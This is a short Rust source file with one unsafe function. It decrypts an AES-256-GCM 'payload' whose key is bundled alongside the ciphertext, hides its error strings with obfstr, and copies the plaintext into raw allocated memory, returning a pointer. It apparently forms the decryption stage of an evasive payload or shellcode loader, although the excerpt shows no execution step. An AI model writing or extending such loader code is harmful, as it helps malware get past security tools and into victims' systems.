use crate::alloc::alloc;

pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Using AES decryption...");

    use aes_gcm::{Aes256Gcm, Key, Nonce};
    use aes_gcm::aead::{AeadInPlace, KeyInit};
    use obfstr::obfstr;

    let key_len = 32;  // AES-256 key size
    let nonce_len = 12; // GCM nonce size
    let tag_len = 16;   // GCM tag size
    
    if decoded.len() < key_len + nonce_len + tag_len {
        return Err(obfstr!("aes payload too short").to_string());
    }
    
    let key = &decoded[0..key_len];
    let nonce = &decoded[key_len..key_len + nonce_len];
    let tag = &decoded[key_len + nonce_len..key_len + nonce_len + tag_len];
    let encrypted = &decoded[key_len + nonce_len + tag_len..];
    
    let mut ciphertext_with_tag = encrypted.to_vec();
    ciphertext_with_tag.extend_from_slice(tag);
    
    let key = Key::<Aes256Gcm>::from_slice(key);
    let nonce = Nonce::from_slice(nonce);
    let cipher = Aes256Gcm::new(key);
    
    cipher.decrypt_in_place(nonce, &[], &mut ciphertext_with_tag)
        .map_err(|_| obfstr!("aes decryption failed").to_string())?;
    
    let pt_len = ciphertext_with_tag.len();
    let p = unsafe { alloc(pt_len)? };
    std::ptr::copy_nonoverlapping(ciphertext_with_tag.as_ptr(), p, pt_len);
    
    Ok((p as usize, pt_len))
}